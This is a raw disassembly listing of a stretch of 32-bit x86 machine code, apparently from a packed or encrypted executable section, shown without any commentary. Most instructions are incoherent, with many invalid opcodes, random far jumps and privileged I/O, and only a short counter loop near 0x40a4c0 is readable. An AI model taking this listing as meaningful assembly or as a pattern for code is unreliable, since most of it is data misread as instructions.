  40a01e:	cmp    eax,0x997ed779
  40a023:	(bad)  
  40a024:	sbb    ah,BYTE PTR [edx+0x3a3a5072]
  40a02a:	cs pop edi
  40a02c:	dec    edx
  40a02d:	ins    BYTE PTR es:[edi],dx
  40a02e:	xchg   esi,eax
  40a02f:	dec    esp
  40a030:	mov    edi,0x7d38a4f
  40a035:	mov    ds:0xa00e3005,eax
  40a03a:	add    eax,0x3de2f6de
  40a03f:	aaa    
  40a040:	das    
  40a041:	mov    bl,0x5e
  40a043:	mov    BYTE PTR [esi-0x19854dfc],ch
  40a049:	pop    es
  40a04a:	aaa    
  40a04b:	sbb    eax,0x80c0e56b
  40a050:	(bad)  
  40a051:	xchg   esp,eax
  40a052:	fild   WORD PTR [eax+edi*1-0x57]
  40a056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a057:	repz sbb ch,BYTE PTR [esi+edx*4+0x16]
  40a05c:	dec    edx
  40a05d:	jle    0x40a0b2
  40a05f:	mov    esi,0xf7086082
  40a064:	jns    0x40a000
  40a066:	jne    0x40a08d
  40a068:	pop    ecx
  40a069:	shl    DWORD PTR [esi],0x2
  40a06c:	shl    BYTE PTR [ebx],cl
  40a06e:	adc    eax,0x1f96c798
  40a073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a074:	stc    
  40a075:	hlt    
  40a076:	mov    eax,0xf838ecd2
  40a07b:	rcl    esp,0x89
  40a07e:	and    dl,BYTE PTR [ecx+0x59c71e63]
  40a084:	cmp    ecx,0xffffffdc
  40a087:	add    BYTE PTR [edx-0x74],dh
  40a08a:	mov    dh,0xe7
  40a08c:	fcom   DWORD PTR [edx-0x421ff43]
  40a092:	jle    0x40a0f3
  40a094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a095:	outs   dx,BYTE PTR ds:[esi]
  40a096:	add    ebp,DWORD PTR [ecx-0xd0a0ded]
  40a09c:	mov    al,0xb
  40a09e:	es push ss
  40a0a0:	stos   DWORD PTR es:[edi],eax
  40a0a1:	frstor [ebp+0xd3d8d3f]
  40a0a7:	push   ds
  40a0a8:	arpl   WORD PTR [esi],si
  40a0aa:	add    edx,DWORD PTR [ebp+esi*4-0x7b]
  40a0ae:	dec    ebp
  40a0af:	xchg   esp,eax
  40a0b0:	out    0xab,al
  40a0b2:	xchg   ebp,eax
  40a0b3:	cmp    al,0xf8
  40a0b5:	dec    edi
  40a0b6:	xlat   BYTE PTR ds:[ebx]
  40a0b7:	sub    DWORD PTR [ecx+edx*8],esp
  40a0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0bb:	imul   ebx,DWORD PTR [ebx-0x33a24d21],0x26
  40a0c2:	or     esp,DWORD PTR [edx+0x57]
  40a0c5:	int3   
  40a0c6:	(bad)  
  40a0c7:	out    dx,al
  40a0c8:	sti    
  40a0c9:	mov    ds:0x6458db97,eax
  40a0ce:	push   ebx
  40a0cf:	fisttp WORD PTR [edx-0x75d816cf]
  40a0d5:	idiv   DWORD PTR [esi]
  40a0d7:	push   0x50
  40a0d9:	xchg   ecx,eax
  40a0da:	add    al,BYTE PTR [edi]
  40a0dc:	jp     0x40a0a0
  40a0de:	jo     0x40a127
  40a0e0:	add    eax,edx
  40a0e2:	dec    ecx
  40a0e3:	jp     0x40a151
  40a0e5:	mov    bh,0x17
  40a0e7:	xchg   ebx,eax
  40a0e8:	add    BYTE PTR [ecx-0x5d],dh
  40a0eb:	mov    ebx,0xc03d247b
  40a0f0:	push   ss
  40a0f1:	ins    DWORD PTR es:[edi],dx
  40a0f2:	xchg   ecx,eax
  40a0f3:	shl    ah,0xff
  40a0f6:	mov    al,ds:0xe02906ad
  40a0fb:	inc    edi
  40a0fc:	inc    esp
  40a0fd:	cmp    eax,0xfb2f3abf
  40a102:	and    DWORD PTR [eax],esi
  40a104:	test   al,0x40
  40a106:	mov    al,0x10
  40a108:	sub    al,0x92
  40a10a:	aas    
  40a10b:	bound  ebp,QWORD PTR [edi*1+0x6990290e]
  40a112:	mov    edi,0x869eb388
  40a117:	mov    ch,BYTE PTR [ebp+0x76]
  40a11a:	repz out 0xa8,al
  40a11d:	push   ebp
  40a11e:	pop    ds
  40a11f:	aam    0x58
  40a121:	mov    ebp,0x8cc5300d
  40a126:	shr    DWORD PTR [edx],0x4e
  40a129:	pop    edi
  40a12a:	fsubr  DWORD PTR [edx+esi*4-0x6d]
  40a12e:	jb     0x40a172
  40a130:	mov    edx,ecx
  40a132:	inc    eax
  40a133:	cld    
  40a134:	cmc    
  40a135:	mov    esp,0xbd3c071f
  40a13a:	fwait
  40a13b:	mov    WORD PTR [ecx-0x6f],ss
  40a13e:	mov    ebp,DWORD PTR [ecx+0x7ebd9dee]
  40a144:	mov    ?,WORD PTR [esi+0x1a]
  40a147:	or     al,BYTE PTR [ebx]
  40a149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a14a:	imul   esp,DWORD PTR [eax],0x16ee811f
  40a150:	scas   eax,DWORD PTR es:[edi]
  40a151:	mov    edx,0xb6ed2eb0
  40a156:	push   ss
  40a157:	dec    edi
  40a158:	repz pop ss
  40a15a:	retf   0xcd0b
  40a15d:	aas    
  40a15e:	stos   BYTE PTR es:[edi],al
  40a15f:	dec    edi
  40a160:	fadd   DWORD PTR [ecx-0x1f]
  40a163:	int3   
  40a164:	mov    ds:0xe9c63326,al
  40a169:	dec    eax
  40a16a:	add    eax,DWORD PTR [eax]
  40a16c:	add    BYTE PTR [ebp+0xa],dl
  40a16f:	loopne 0x40a13d
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	cmc    
  40a17a:	cmp    al,0x3b
  40a17c:	mov    ah,0x39
  40a17e:	out    0x7e,eax
  40a180:	jle    0x40a1b0
  40a182:	jge    0x40a202
  40a184:	jle    0x40a120
  40a186:	jmp    0x40a14f
  40a188:	adc    eax,0x8155366b
  40a18d:	mov    bl,0x38
  40a18f:	xor    DWORD PTR [edx-0x6accc5cc],edx
  40a195:	in     eax,0xb4
  40a197:	test   eax,0xe9dd89f9
  40a19c:	out    0x95,eax
  40a19e:	gs ja  0x40a218
  40a1a1:	push   ecx
  40a1a2:	sbb    ch,BYTE PTR [edx-0x4]
  40a1a5:	pop    ebp
  40a1a6:	sub    BYTE PTR [ecx-0x5b],ch
  40a1a9:	dec    BYTE PTR [edi]
  40a1ab:	or     ebp,esp
  40a1ad:	leave  
  40a1ae:	xchg   esp,eax
  40a1af:	inc    eax
  40a1b0:	mov    al,0x6d
  40a1b2:	out    0xeb,al
  40a1b4:	fwait
  40a1b5:	addr16 dec eax
  40a1b7:	fdivr  QWORD PTR [edx+0x5f9bb6fe]
  40a1bd:	and    eax,0xf34dfbfa
  40a1c2:	rcl    BYTE PTR [edx-0x1],cl
  40a1c5:	shr    DWORD PTR [eax-0x74e7712a],1
  40a1cb:	aam    0xeb
  40a1cd:	das    
  40a1ce:	xchg   BYTE PTR [edx],ch
  40a1d0:	xchg   esi,eax
  40a1d1:	sbb    DWORD PTR [esi],edi
  40a1d3:	jns    0x40a165
  40a1d5:	mov    esi,0xae9d803b
  40a1da:	in     al,0x3a
  40a1dc:	ins    DWORD PTR es:[edi],dx
  40a1dd:	mov    ds:0xc0ff1cbd,eax
  40a1e2:	or     al,0x6a
  40a1e4:	sub    al,0x67
  40a1e6:	jmp    0x29dd5c9e
  40a1eb:	dec    ecx
  40a1ec:	push   edx
  40a1ed:	mov    ds:0x8242a027,eax
  40a1f2:	loopne 0x40a180
  40a1f4:	loope  0x40a211
  40a1f6:	(bad)  
  40a1f8:	xchg   edx,eax
  40a1f9:	and    DWORD PTR es:[edi+0xa26f0e2],edx
  40a200:	int    0x6e
  40a202:	lods   eax,DWORD PTR ds:[esi]
  40a203:	clc    
  40a204:	pop    ecx
  40a205:	ins    BYTE PTR es:[edi],dx
  40a206:	addr16 clc 
  40a208:	mov    ch,0x1e
  40a20a:	repnz cmp BYTE PTR [ecx+edx*2],al
  40a20e:	gs push edi
  40a210:	hlt    
  40a211:	cmc    
  40a212:	mov    cl,0xe7
  40a214:	out    0x33,eax
  40a216:	test   DWORD PTR [ebx],edx
  40a218:	add    edx,DWORD PTR [edi]
  40a21a:	jmp    0xdf8b:0xf28ef8b0
  40a221:	xchg   ebp,eax
  40a222:	cmovo  eax,esp
  40a225:	mov    ecx,0x4f0e2289
  40a22a:	jne    0x40a23d
  40a22c:	xor    al,0x77
  40a22e:	std    
  40a22f:	loope  0x40a218
  40a231:	mov    DWORD PTR [edx-0x76a362c4],eax
  40a237:	js     0x40a224
  40a239:	add    BYTE PTR [edx],dh
  40a23b:	inc    eax
  40a23c:	retf   
  40a23d:	hlt    
  40a23e:	mov    ebx,0x6a13a9f
  40a243:	test   al,0xee
  40a245:	mov    ds,WORD PTR [ebp-0x6d]
  40a248:	jge    0x40a299
  40a24a:	ja     0x40a258
  40a24c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a24d:	inc    esi
  40a24e:	out    dx,eax
  40a24f:	cs dec ecx
  40a251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a252:	shl    DWORD PTR [ecx],cl
  40a254:	xlat   BYTE PTR ds:[ebx]
  40a255:	imul   esp,esi,0x50
  40a258:	xchg   ebx,eax
  40a259:	pushf  
  40a25a:	test   al,0x28
  40a25c:	adc    BYTE PTR [edi+0x3d],ah
  40a25f:	fcom   QWORD PTR [eax+0x62f67d4b]
  40a265:	xchg   esp,eax
  40a266:	dec    ebp
  40a267:	mov    al,ds:0xa294150f
  40a26c:	sbb    cl,ch
  40a26e:	pop    ecx
  40a26f:	clc    
  40a270:	retf   
  40a271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a272:	pop    es
  40a273:	test   DWORD PTR [esi-0x36261f42],eax
  40a279:	in     al,0xfc
  40a27b:	scas   eax,DWORD PTR es:[edi]
  40a27c:	jle    0x40a22d
  40a27e:	leave  
  40a27f:	fsub   QWORD PTR [bx+si]
  40a282:	enter  0x7ff1,0x73
  40a286:	ss ins DWORD PTR es:[edi],dx
  40a288:	sub    al,BYTE PTR [esi-0x570f6eae]
  40a28e:	lods   eax,DWORD PTR ds:[esi]
  40a28f:	fcomp  QWORD PTR ds:0xbba9c2f4
  40a295:	mov    ecx,0xe70b2468
  40a29a:	js     0x40a297
  40a29c:	cmc    
  40a29d:	dec    edi
  40a29e:	jl     0x40a25e
  40a2a0:	xor    esp,0x66406e26
  40a2a6:	stos   DWORD PTR es:[edi],eax
  40a2a7:	shr    DWORD PTR [ecx],cl
  40a2a9:	mov    esi,0xf667a8bd
  40a2ae:	inc    eax
  40a2b0:	addr16 jg 0x40a238
  40a2b3:	xlat   BYTE PTR ds:[ebx]
  40a2b4:	dec    ecx
  40a2b5:	test   DWORD PTR [edi+0x719fe71],esp
  40a2bb:	rol    BYTE PTR [ecx+0x1d],0x5f
  40a2bf:	int    0x4f
  40a2c1:	rcl    DWORD PTR [edi],0xfb
  40a2c4:	xor    BYTE PTR [ebx],bh
  40a2c6:	test   eax,0xd07f01df
  40a2cb:	popf   
  40a2cc:	pop    edx
  40a2cd:	repz (bad) 
  40a2cf:	mov    bl,0xbd
  40a2d1:	dec    ecx
  40a2d2:	mov    bh,0xd9
  40a2d4:	and    eax,0xce286701
  40a2d9:	cli    
  40a2da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2db:	stos   DWORD PTR es:[edi],eax
  40a2dc:	jmp    0x5554:0xa7fe9639
  40a2e3:	jmp    0x40a29a
  40a2e5:	or     BYTE PTR [esi+0x1a9632a6],0xfc
  40a2ec:	arpl   WORD PTR [ebp-0x3a],ax
  40a2ef:	setno  BYTE PTR [ecx-0x23]
  40a2f3:	add    al,0x12
  40a2f5:	sub    eax,DWORD PTR [ebx]
  40a2f7:	fsubr  QWORD PTR [ebx]
  40a2f9:	rol    DWORD PTR [ecx+0x78],cl
  40a2fc:	dec    ebp
  40a2fd:	rcr    dh,cl
  40a2ff:	cld    
  40a300:	jp     0x40a2a9
  40a302:	or     eax,0xff2ddebf
  40a307:	push   ss
  40a308:	(bad)  
  40a309:	ins    BYTE PTR es:[edi],dx
  40a30a:	sbb    ebx,ebx
  40a30c:	das    
  40a30d:	mov    bl,0x8
  40a30f:	fidivr WORD PTR [esi+0x2ef0db9a]
  40a315:	test   DWORD PTR [edi-0x71],edi
  40a318:	lock cmp eax,0xc756e2e4
  40a31e:	inc    ebp
  40a31f:	dec    esp
  40a320:	jp     0x40a399
  40a322:	jnp    0x40a357
  40a324:	rol    bl,0xbe
  40a327:	dec    esp
  40a328:	cwde   
  40a329:	ja     0x40a2df
  40a32b:	fidiv  WORD PTR [esi+0xc]
  40a32e:	stos   BYTE PTR es:[edi],al
  40a32f:	loop   0x40a382
  40a331:	outs   dx,DWORD PTR ds:[esi]
  40a332:	and    BYTE PTR [esi+0x1b],ah
  40a335:	rol    DWORD PTR [ebx+ebp*2+0x72444796],cl
  40a33c:	test   eax,0xb0e6ba4d
  40a341:	fnsave [edi+0x26]
  40a344:	mov    bl,0xd7
  40a346:	push   0xffffffdf
  40a348:	mov    bl,0x4b
  40a34a:	mov    al,0x2a
  40a34c:	ja     0x40a373
  40a34e:	jmp    0x40a308
  40a350:	mov    ebx,0x53078642
  40a355:	dec    esp
  40a356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a357:	pop    esi
  40a358:	push   ebx
  40a359:	(bad)  
  40a35a:	pop    ecx
  40a35b:	push   edx
  40a35c:	int    0x9d
  40a35e:	in     al,dx
  40a35f:	jle    0x40a313
  40a361:	inc    eax
  40a362:	icebp  
  40a363:	imul   edx,DWORD PTR [edx-0x5b],0x50802c21
  40a36a:	cmc    
  40a36b:	or     eax,0x9e788eaf
  40a370:	test   BYTE PTR [eax-0x74],dh
  40a373:	mov    BYTE PTR [ecx+eax*8],ah
  40a376:	ss push esp
  40a378:	jg     0x40a3aa
  40a37a:	mov    edx,DWORD PTR [ecx+0x36]
  40a37d:	cs mov bl,0xf4
  40a380:	out    dx,al
  40a381:	mov    ebx,0x3690aad1
  40a386:	gs xchg edx,eax
  40a388:	loope  0x40a320
  40a38a:	outs   dx,DWORD PTR ds:[esi]
  40a38b:	push   edi
  40a38c:	rol    BYTE PTR [edi+0x929435f],cl
  40a392:	jmp    0x40a31b
  40a394:	sbb    ah,dl
  40a396:	(bad)  
  40a397:	mov    esp,0xa7b51e62
  40a39c:	mov    ebp,DWORD PTR [eax+0x1c]
  40a39f:	pop    esp
  40a3a0:	hlt    
  40a3a1:	sub    dl,ch
  40a3a3:	out    0xb5,eax
  40a3a5:	pop    ebx
  40a3a6:	adc    ecx,ebp
  40a3a8:	inc    edx
  40a3a9:	leave  
  40a3aa:	mov    esi,0xdb93f2e4
  40a3af:	imul   eax,DWORD PTR [edx],0xd2b7c2bc
  40a3b5:	lods   eax,DWORD PTR ds:[esi]
  40a3b6:	les    ecx,FWORD PTR [ecx]
  40a3b8:	pop    edi
  40a3b9:	iret   
  40a3ba:	pop    ss
  40a3bb:	dec    esp
  40a3bc:	pop    eax
  40a3bd:	ins    DWORD PTR es:[edi],dx
  40a3be:	jmp    0xbaa4f63
  40a3c3:	mov    edx,0x1836dd09
  40a3c8:	dec    ebp
  40a3c9:	call   DWORD PTR [edi-0x230a46c5]
  40a3cf:	pop    edx
  40a3d0:	pop    edx
  40a3d1:	mov    al,0x86
  40a3d3:	fnsave [eax-0x54761a03]
  40a3d9:	dec    esp
  40a3da:	jmp    0xebcc50a6
  40a3df:	xchg   edx,eax
  40a3e0:	adc    eax,DWORD PTR [edi+0x202fafa2]
  40a3e6:	push   ebp
  40a3e7:	fdiv   QWORD PTR [edi+ebx*2+0x2a]
  40a3eb:	test   al,0xb6
  40a3ed:	faddp  st(0),st
  40a3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3f0:	cmp    eax,0x80035370
  40a3f5:	cmp    ebp,ebx
  40a3f7:	into   
  40a3f8:	stos   BYTE PTR es:[edi],al
  40a3f9:	jmp    0x40a3ef
  40a3fb:	dec    esp
  40a3fc:	call   FWORD PTR ds:0xb657e4ac
  40a402:	or     al,0x82
  40a404:	je     0x40a449
  40a406:	or     al,0x3b
  40a408:	adc    DWORD PTR [ebp-0x46],ecx
  40a40b:	and    eax,esi
  40a40d:	aaa    
  40a40e:	ja     0x40a3c8
  40a410:	jb     0x40a3ca
  40a412:	xor    BYTE PTR [ebp-0x4b9fec38],al
  40a418:	inc    edx
  40a419:	or     DWORD PTR [eax-0x3e],ebx
  40a41c:	repz mov bh,0x91
  40a41f:	xchg   ebx,eax
  40a420:	bnd jl 0x40a48e
  40a423:	pop    ebp
  40a424:	int    0x23
  40a426:	lock test DWORD PTR [ebx-0x2b3601e8],ebp
  40a42d:	ficom  DWORD PTR [ebx+0x2]
  40a430:	(bad)  
  40a431:	pusha  
  40a432:	jmp    0x394eb851
  40a437:	mov    bl,BYTE PTR [eax+0x3c]
  40a43a:	fsubr  DWORD PTR [edi+0x63]
  40a43d:	sub    eax,esi
  40a43f:	jb     0x40a40d
  40a441:	pop    edi
  40a442:	sbb    edi,DWORD PTR [edi]
  40a444:	dec    ecx
  40a445:	and    BYTE PTR [edx+0xfc8f6e8],bl
  40a44b:	fwait
  40a44c:	shl    BYTE PTR [esi+0x786cc388],0x5a
  40a453:	and    esi,DWORD PTR [ebp-0x70]
  40a456:	leave  
  40a457:	fidivr DWORD PTR [ebx+0x6b0cfe2b]
  40a45d:	mov    DWORD PTR [edi+0x40],0xdc19d698
  40a464:	push   ebx
  40a465:	js     0x40a49e
  40a467:	jno    0x40a47f
  40a469:	sub    DWORD PTR [edx+0xe],esi
  40a46c:	jp     0x40a45b
  40a46e:	jle    0x40a482
  40a470:	sub    edx,0x1e7308b7
  40a476:	add    ch,bh
  40a478:	adc    BYTE PTR [ebx+0x14],dl
  40a47b:	outs   dx,DWORD PTR ds:[esi]
  40a47c:	aad    0x39
  40a47e:	jae    0x40a4e3
  40a480:	sti    
  40a481:	std    
  40a482:	int    0x11
  40a484:	sti    
  40a485:	mov    ah,0x36
  40a487:	pop    ebp
  40a488:	imul   esi,DWORD PTR [ebx+0x3d],0xe68dca4a
  40a48f:	pop    es
  40a490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a491:	cmc    
  40a492:	jbe    0x40a4fd
  40a494:	out    dx,eax
  40a495:	add    eax,0x1d18db94
  40a49a:	dec    edi
  40a49b:	das    
  40a49c:	sub    eax,0xe8a78242
  40a4a1:	or     al,0xa4
  40a4a3:	and    DWORD PTR [esi-0x6318cb71],ecx
  40a4a9:	ja     0x40a42b
  40a4ab:	aad    0x8f
  40a4ad:	ficom  DWORD PTR [ebx-0x39fa8c2e]
  40a4b3:	aaa    
  40a4b4:	test   BYTE PTR [ebx],al
  40a4b6:	mov    DWORD PTR [ecx+0x4302f125],0x0
  40a4c0:	add    BYTE PTR [ebx],dh
  40a4c2:	fisttp DWORD PTR [ebx]
  40a4c4:	sbb    eax,0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	mov    BYTE PTR ss:[eax-0x2c],dh
  40a514:	push   0xffffffe9
  40a516:	loop   0x40a596
  40a518:	jle    0x40a548
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a4f0
  40a51e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a51f:	dec    edx
  40a521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a522:	pop    edx
  40a523:	sub    BYTE PTR [eax],al
  40a525:	test   DWORD PTR [ecx+0x7af3d4f],esi
  40a52b:	jmp    0x9ed3:0x5f578c9c
  40a532:	ins    BYTE PTR es:[edi],dx
  40a533:	rcl    DWORD PTR [ecx],1
  40a535:	and    BYTE PTR [eax+0x7cad6f43],0xca
  40a53c:	(bad)  
  40a53d:	psubb  mm6,QWORD PTR [edi+0x38]
  40a541:	xlat   BYTE PTR ds:[ebx]
  40a542:	inc    ecx
  40a543:	sub    esi,DWORD PTR [edx+0x5c73bd99]
  40a549:	mov    ch,0x74
  40a54b:	mov    ch,0x62
  40a54d:	push   edx
  40a54e:	ds or  ebx,edi
  40a551:	adc    al,0x41
  40a553:	loope  0x40a541
  40a555:	rcr    DWORD PTR [ebx+0x51202681],1
  40a55b:	xchg   BYTE PTR [edi+0x26a89970],cl
  40a561:	sub    bh,cl
  40a563:	out    dx,al
  40a564:	mov    edx,0x95772ef4
  40a569:	test   eax,0x66812d8c
  40a56e:	push   eax
  40a56f:	jle    0x40a5ea
  40a571:	add    al,0x4f
  40a573:	scas   al,BYTE PTR es:[edi]
  40a574:	sahf   
  40a575:	fist   DWORD PTR [edx]
  40a577:	cdq    
  40a578:	adc    al,0x90
  40a57a:	and    DWORD PTR [eax+0xe],esp
  40a57d:	push   es
  40a57e:	cmp    al,0x8d
  40a580:	or     eax,0xbdb464c5
  40a585:	dec    ebx
  40a586:	cmp    BYTE PTR [edx+0x70],0xf0
  40a58a:	mov    edi,0x6b5028d6
  40a58f:	mov    eax,0xd0f4c18c
  40a594:	xchg   ecx,eax
  40a595:	xor    eax,0x53f6a2c
  40a59a:	icebp  
  40a59b:	mov    ds:0x4fb5822f,al
  40a5a0:	adc    DWORD PTR cs:[edx+0x38],ebp
  40a5a4:	test   cx,0x77e8
  40a5a9:	mov    ah,0x7a
  40a5ab:	sub    al,0xda
  40a5ad:	leave  
  40a5ae:	imul   eax,DWORD PTR [esi+ebp*4],0x37
  40a5b2:	(bad)  
  40a5b3:	mov    cl,0x40
  40a5b5:	retf   0x1ae6
  40a5b8:	imul   ebx,DWORD PTR [ecx],0x53
  40a5bb:	icebp  
  40a5bc:	mov    esi,0x5e34d022
  40a5c1:	std    
  40a5c2:	call   0xae187fe4
  40a5c7:	jmp    0x40a597
  40a5c9:	and    BYTE PTR [edx],al
  40a5cb:	fist   WORD PTR [edx-0x68fda0d7]
  40a5d1:	ror    BYTE PTR [ecx],cl
  40a5d3:	sahf   
  40a5d4:	inc    ecx
  40a5d5:	sti    
  40a5d6:	jg     0x40a648
  40a5d8:	ja     0x40a634
  40a5da:	int    0xbc
  40a5dc:	retf   
  40a5dd:	mov    DWORD PTR [edi-0x45],ecx
  40a5e0:	(bad)  
  40a5e1:	aaa    
  40a5e2:	add    al,0x87
  40a5e4:	cld    
  40a5e5:	ret    
  40a5e6:	lock xor al,BYTE PTR [edi-0x496e899]
  40a5ed:	cwde   
  40a5ee:	mov    dl,BYTE PTR [esi+0x155e4a40]
  40a5f4:	in     al,dx
  40a5f5:	icebp  
  40a5f6:	mov    ds:0x3bbf96c5,eax
  40a5fb:	cli    
  40a5fc:	fmul   QWORD PTR [ecx]
  40a5fe:	stos   DWORD PTR es:[edi],eax
  40a5ff:	pop    ebp
  40a600:	ret    
  40a601:	aam    0xf5
  40a603:	mov    DWORD PTR [edx],0xfb9a21d0
  40a609:	add    BYTE PTR [ecx-0x7af0215c],0x8a
  40a610:	cld    
  40a611:	fwait
  40a612:	retf   0x3325
  40a615:	push   edi
  40a616:	in     eax,0x3d
  40a618:	outs   dx,BYTE PTR ds:[esi]
  40a619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a61a:	jg     0x40a5fe
  40a61c:	xchg   edx,eax
  40a61d:	push   ebx
  40a61e:	ret    
  40a61f:	mov    dh,0xca
  40a621:	pop    ss
  40a622:	xchg   edi,eax
  40a623:	pusha  
  40a624:	aad    0xea
  40a626:	ss test dh,0xd7
  40a62a:	sbb    BYTE PTR [edx+esi*2],dh
  40a62d:	jb     0x40a5ef
  40a62f:	mov    cl,0x74
  40a631:	imul   ebx,DWORD PTR [esi],0x23f1d836
  40a637:	xchg   DWORD PTR [esi],ebx
  40a639:	sbb    DWORD PTR [eax],ecx
  40a63b:	loop   0x40a669
  40a63d:	inc    edi
  40a63e:	(bad)  
  40a63f:	(bad)  
  40a640:	pop    esp
  40a641:	or     BYTE PTR [eax+0x358dbb4c],dh
  40a647:	or     al,bh
  40a649:	inc    ecx
  40a64b:	push   esi
  40a64c:	(bad)  
  40a64e:	lahf   
  40a64f:	jecxz  0x40a6a6
  40a651:	je     0x40a6ba
  40a653:	dec    edi
  40a654:	sub    BYTE PTR [esi],dl
  40a656:	js     0x40a669
  40a658:	mov    ebx,0x26769c30
  40a65d:	add    ebp,esp
  40a65f:	ret    0xb60
  40a662:	inc    esp
  40a663:	jg     0x40a6d1
  40a665:	cmp    bl,al
  40a667:	pop    ebx
  40a668:	(bad)  
  40a669:	xchg   ebp,eax
  40a66a:	add    cl,BYTE PTR [ecx+0x705b5da9]
  40a670:	jge    0x40a5fd
  40a672:	mov    ah,0x93
  40a674:	push   esp
  40a675:	stos   BYTE PTR es:[edi],al
  40a676:	icebp  
  40a677:	mov    eax,0x65fdc9b3
  40a67c:	fild   DWORD PTR [esi]
  40a67e:	xlat   BYTE PTR ds:[ebx]
  40a67f:	xchg   ebx,eax
  40a680:	repnz daa 
  40a682:	pop    es
  40a683:	das    
  40a684:	or     ch,0xb9
  40a687:	xchg   edx,eax
  40a688:	jmp    0x4eb:0x2379e835
  40a68f:	retf   
  40a690:	std    
  40a691:	push   edx
  40a692:	dec    esp
  40a693:	cmp    al,0xc2
  40a695:	cmp    al,0x98
  40a697:	outs   dx,BYTE PTR ds:[esi]
  40a698:	push   esp
  40a699:	mov    dh,dl
  40a69b:	int    0x2f
  40a69d:	pop    ecx
  40a69e:	sub    bl,BYTE PTR [eax+0x7fa08361]
  40a6a4:	(bad)  
  40a6a5:	ss dec ebx
  40a6a7:	sar    BYTE PTR [edx+0x4333cc05],cl
  40a6ad:	mov    eax,ds:0x4ff4b4b0
  40a6b2:	dec    ecx
  40a6b3:	or     BYTE PTR [edi],bl
  40a6b5:	add    WORD PTR [edi-0x119e9522],si
  40a6bc:	stc    
  40a6bd:	dec    edi
  40a6be:	(bad)  
  40a6bf:	cwde   
  40a6c0:	push   eax
  40a6c1:	sti    
  40a6c2:	stos   DWORD PTR es:[edi],eax
  40a6c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6c4:	cmp    ch,BYTE PTR [ebx+0x25]
  40a6c7:	fdivrp st(7),st
  40a6c9:	daa    
  40a6ca:	sahf   
  40a6cb:	rcl    BYTE PTR ds:0x7b848b1c,1
  40a6d1:	inc    DWORD PTR [edi+0x380c134e]
  40a6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d8:	call   0x186173a3
  40a6dd:	and    eax,0x64b5ec6c
  40a6e2:	add    eax,0x638248a7
  40a6e8:	sbb    DWORD PTR [edi-0x10a51559],ebp
  40a6ee:	loop   0x40a76c
  40a6f0:	out    0x25,eax
  40a6f2:	mov    dh,0x51
  40a6f4:	and    eax,0x7cd218b5
  40a6f9:	jmp    0x40a6bd
  40a6fb:	pop    es
  40a6fc:	mov    edi,0xe116c2b1
  40a701:	rcr    ecx,cl
  40a703:	inc    esi
  40a704:	push   esp
  40a705:	sbb    eax,0x2e21edfb
  40a70a:	jmp    0x40a699
  40a70c:	or     eax,0x5efaceb2
  40a711:	or     bl,BYTE PTR [ecx]
  40a713:	mov    ecx,0xd204a872
  40a718:	sub    al,0x11
  40a71a:	aad    0x9c
  40a71c:	data16 aad 0xea
  40a71f:	adc    bh,BYTE PTR [esi]
  40a721:	add    BYTE PTR [ebx+0x6976a61b],0xe7
  40a728:	es fisubr WORD PTR ds:[esi+0x7732031f]
  40a730:	xor    eax,0x50e4cb30
  40a735:	fsub   QWORD PTR [eax]
  40a737:	jg     0x40a709
  40a739:	enter  0x6f2f,0x9f
  40a73d:	aad    0x72
  40a73f:	mov    eax,0x42d37a50
  40a744:	loope  0x40a7bd
  40a746:	xor    eax,0x6d4003e6
  40a74b:	stos   BYTE PTR es:[edi],al
  40a74c:	sahf   
  40a74d:	rcr    cl,0x2f
  40a750:	ins    BYTE PTR es:[edi],dx
  40a751:	sub    eax,ebx
  40a753:	adc    BYTE PTR [edi-0x18],ah
  40a756:	dec    ebp
  40a757:	push   0xfffffff9
  40a759:	xor    ah,bh
  40a75b:	push   edi
  40a75c:	mov    al,ds:0x2b96a6db
  40a761:	or     edx,DWORD PTR [ecx]
  40a763:	xchg   edx,eax
  40a764:	dec    edi
  40a765:	sbb    edi,DWORD PTR [edx+0x6]
  40a768:	js     0x40a78b
  40a76a:	frstor [edx+0xe]
  40a76d:	push   ebx
  40a76e:	cwde   
  40a76f:	xor    BYTE PTR [edx+0x50],0xfc
  40a773:	push   eax
  40a774:	mov    ds:0xddfcbbae,eax
  40a779:	or     esi,ecx
  40a77b:	pop    edi
  40a77c:	pushf  
  40a77d:	pop    eax
  40a77e:	jl     0x40a7dd
  40a780:	sub    DWORD PTR [esi-0x7c],ebp
  40a783:	loopne 0x40a7bb
  40a785:	test   BYTE PTR [ecx],0xdc
  40a788:	aaa    
  40a789:	pop    ebx
  40a78a:	retf   
